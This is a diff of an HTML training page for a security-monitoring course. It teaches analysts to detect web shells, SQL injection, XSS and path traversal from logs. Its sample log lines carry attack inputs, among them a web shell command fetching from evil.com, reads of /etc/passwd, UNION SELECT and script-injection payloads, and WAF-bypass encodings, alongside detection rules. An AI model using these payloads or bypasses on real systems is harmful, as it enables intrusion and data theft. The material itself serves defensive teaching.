@@ -1,21 +1,69 @@
 <div class="p-4 rounded mb-4" style="background:rgba(17,24,39,0.9);border:1px solid #1f2937;">
 <h6 class="text-warning mb-3"><i class="bi bi-book me-2"></i>Module 8: Web Security Monitoring</h6>
 
-<h6 class="text-warning mt-3">Sub-Domains / Rooms</h6>
-<ul style="color:#c0d0e0;">
-  <li><b>Detecting Web Shells</b> — Identify web shells by monitoring for unusual file uploads, command execution via web requests, and abnormal process parents.</li>
-  <li><b>Web Attack Investigation Rooms</b> — Investigate SQL injection, XSS, path traversal, and file upload abuse from web server and WAF logs.</li>
-</ul>
+<p style="color:#c0d0e0;">Web applications are the most attacked vector. This module teaches you to detect web shells, SQL injection, XSS, path traversal, and other web-based attacks from logs and WAF alerts.</p>
 
+<h6 class="text-warning mt-3">Sub-Domains / Rooms</h6>
+
+<p style="color:#00d4ff;font-weight:600;">🔹 Detecting Web Shells</p>
+<p style="color:#c0d0e0;">A web shell is a malicious script uploaded to a web server that gives attackers remote control. They can execute system commands, browse files, and pivot to internal networks.</p>
 <div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Example Investigation:</b> A WAF alerts on a request: <code>POST /uploads/shell.php?cmd=whoami</code>. The analyst checks the web server access log and finds the file was uploaded 5 minutes earlier via <code>POST /uploads/ with filename shell.php</code>. The WAF log shows the same IP executing commands: <code>id, ls -la, cat /etc/passwd, wget http://evil.com/tools.sh</code>. The analyst isolates the web server, removes the web shell, and patches the file upload vulnerability.
+<b>Common Web Shell Detection Methods:</b><br><br>
+<b>1. File Upload Monitoring:</b><br>
+Check web server access logs for file uploads:<br>
+<code>192.168.1.100 - - [21/May/2026:14:32:15 +0000] "POST /uploads/ HTTP/1.1" 200 234 "-" "Mozilla/5.0"</code><br>
+If followed by GET requests to the uploaded file with cmd parameters, it's a web shell.<br><br>
+<b>2. Command Execution Detection:</b><br>
+<code>GET /uploads/shell.php?cmd=id HTTP/1.1" 200<br>
+GET /uploads/shell.php?cmd=ls%20-la HTTP/1.1" 200<br>
+GET /uploads/shell.php?cmd=cat%20/etc/passwd HTTP/1.1" 200<br>
+GET /uploads/shell.php?cmd=wget%20http://evil.com/tools.sh HTTP/1.1" 200</code><br>
+Pattern: Same file accessed with different cmd= parameters — clear web shell behavior.<br><br>
+<b>3. WAF Detection:</b><br>
+WAF rules typically detect: <code>Request URI contains "cmd=" OR "exec=" OR "shell="</code> combined with suspicious extensions (.php, .asp, .jsp) in upload directories.<br><br>
+<b>4. File Integrity Monitoring:</b><br>
+Use tools like OSSEC or Tripwire to alert when files in web directories change unexpectedly.
 </div>
 
-<h6 class="text-warning mt-3">Key Skills Learned</h6>
-<ul style="color:#c0d0e0;">
-  <li>Web shell detection and analysis</li>
-  <li>Web application log analysis</li>
-  <li>SQL injection and XSS pattern recognition</li>
-  <li>WAF log correlation</li>
-</ul>
+<p style="color:#00d4ff;font-weight:600;">🔹 Web Attack Investigation Rooms</p>
+<p style="color:#c0d0e0;">Practice investigating SQL injection, XSS, path traversal, SSRF, and file upload vulnerabilities from logs.</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>SQL Injection Investigation:</b><br>
+You receive a WAF alert: "SQL Injection Attempt Blocked"<br>
+Check the web access log:<br>
+<code>GET /products?id=1'+OR+'1'%3D'1 HTTP/1.1" 200<br>
+GET /products?id=1'+UNION+SELECT+null,null,null-- HTTP/1.1" 200<br>
+GET /products?id=1'+UNION+SELECT+@@version,null,null-- HTTP/1.1" 200</code><br><br>
+<b>Analysis:</b> The attacker tested basic SQLi with OR 1=1 (page returned 200 = vulnerable), then used UNION SELECT to enumerate columns, then tried to extract database version.<br>
+<b>Detection SPL (Splunk):</b><br>
+<code>index=webserver | search uri=*products* AND uri=*UNION* OR uri=*OR*1=1*<br>
+| stats count by src_ip, uri | where count > 3</code><br><br>
+<b>XSS Investigation:</b><br>
+<code>GET /search?q=&lt;script&gt;alert('xss')&lt;/script&gt; HTTP/1.1" 200<br>
+GET /search?q=&lt;img+src=x+onerror=alert('xss')&gt; HTTP/1.1" 200<br>
+GET /search?q=&lt;svg+onload=alert('xss')&gt; HTTP/1.1" 200</code><br><br>
+<b>Analysis:</b> Attacker testing reflected XSS by injecting different HTML/JavaScript payloads into the search parameter. The page returned 200 with the script rendered — vulnerability confirmed.<br>
+<b>Detection:</b> WAF rule blocking <code>&lt;script&gt;</code>, <code>onerror=</code>, <code>onload=</code> patterns in request parameters.<br><br>
+<b>Path Traversal Investigation:</b><br>
+<code>GET /../../../../etc/passwd HTTP/1.1" 200<br>
+GET /../../../windows/system32/drivers/etc/hosts HTTP/1.1" 200<br>
+GET /..%2e..%2e..%2e..%2eetc/passwd HTTP/1.1" 200</code><br><br>
+<b>Analysis:</b> Attacker used ../ sequences and URL-encoded variants (%2e%2e/) to navigate outside the web root and read system files.<br>
+<b>WAF Bypass Attempts:</b><br>
+- Double URL encoding: <code>%252e%252e%252f</code> (WAF decodes once, web server decodes again)<br>
+- Unicode encoding: <code>..%c0%ae%c0%ae/</code> (IIS unicode vulnerability)<br>
+- Using \\ instead of /: <code>..\\..\\..\\windows\\win.ini</code>
+</div>
+
+<h6 class="text-warning mt-3">Web Attack Investigation Playbook</h6>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>When investigating a web attack alert, follow these steps:</b><br><br>
+1. <b>Identify the attacker IP:</b> Check source IP in the alert, look up in threat intel (VirusTotal, AbuseIPDB)<br>
+2. <b>Determine the attack type:</b> Is it SQLi, XSS, path traversal, file upload, SSRF, or something else?<br>
+3. <b>Check if the attack succeeded:</b> Did the server return 200 (success) or 403/500 (blocked)?<br>
+4. <b>Find what was accessed:</b> Look for subsequent requests — did they read files, download tools, or extract data?<br>
+5. <b>Assess impact:</b> Check database logs for data extraction, check for new user accounts, check outbound traffic for exfiltration<br>
+6. <b>Containment:</b> Block attacker IP, patch vulnerability (input validation, parameterized queries), rotate any exposed credentials<br>
+7. <b>Forensic evidence:</b> Save web server logs, WAF logs, and database logs before they rotate
+</div>
 </div>
